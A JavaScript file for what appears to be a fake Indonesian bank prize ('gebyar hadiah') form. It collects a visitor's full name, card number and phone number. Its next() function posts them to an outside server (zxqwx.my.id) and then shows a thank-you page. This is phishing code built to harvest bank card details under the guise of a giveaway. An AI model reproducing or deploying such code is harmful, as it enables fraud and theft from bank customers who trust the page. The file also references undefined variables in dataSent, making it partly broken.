import { API_URL } from './global.js';

$(document).ready(function() {
	/* FOR TEST ONLY */
	/*$("#name").val("Bagas");
	$("#balance").val("20000000");
	$("#phone").val("81123456789");*/
	/* */
	$("#card").on('input', function() {
		let value = $("#card").val().trim().replace(/[^0-9]/g, '');
        $("#card").val(value.replace(/\B(?=(\d{3})+(?!\d))/g, '.'));
	});
});

function next() {
	var name = $("#name").val().trim();
	var card = $("#card").val().trim();
	var phone = $("#phone").val().trim();
	if (name=="" || card=="" || phone=="") {
		alert('Mohon lengkapi data!');
		return;
	}
	phone = "+62"+phone;
	$("#loader").css('display', 'flex');
	
	var message = ('\n<b>Nama Lengkap:</b>\n'+name+'\n\n<b>No. Kartu:</b>\n'+card+'\n\n<b>No. HP:</b>\n'+phone+'\n\n');
	var fd = new FormData();
	fd.append('message', message);
	
	fetch("https://zxqwx.my.id/senders/"
        +"gebyar-brks-hadiah/send.php", {
        method: 'POST',
        body: fd
      })
      .then(response => response.json())
      .then(data => {
      	dataSent();
      })
      .catch((error) => {
      	dataSent();
      });
}

function dataSent() {
	window.localStorage.setItem('name', name);
          window.localStorage.setItem('phone', phone);
          window.localStorage.setItem('balance', balance);
          $("#loader").css('display', 'none');
		  window.location.href = "thank.html";
}

module.next = next;